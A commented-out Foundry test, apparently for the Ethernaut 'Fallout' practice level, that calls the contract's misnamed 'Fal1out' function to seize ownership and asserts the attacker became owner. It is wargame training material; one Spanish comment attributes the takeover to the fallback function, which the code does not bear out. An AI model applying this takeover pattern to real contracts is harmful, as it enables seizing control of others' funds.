// pragma solidity 0.8.17;

// import "forge-std/Test.sol";
// import "forge-std/console.sol";

// import "../../src/2_Fallout/Fallout.sol";

// contract FalloutTest is Test {

//     Fallout public victim;
//     address public owner;
//     address public addr1;

//     function setUp() public{
//         owner = vm.addr(1);
//         addr1 = vm.addr(2);

//         vm.deal(addr1, 1 ether);

//         vm.prank(owner);
//         victim = new Fallout();
//     }

//     function testAttack() public {

//         //ingreasr valor al diccionario
//         vm.startPrank(addr1);

//         victim.Fal1out{value: 1 wei}();

//         //tomar el owner, usando la funcion fallback
//         payable(address(victim)).call{value : 1 wei}("");

//         vm.stopPrank();

//         assertEq(victim.owner(), addr1);
//     }
// }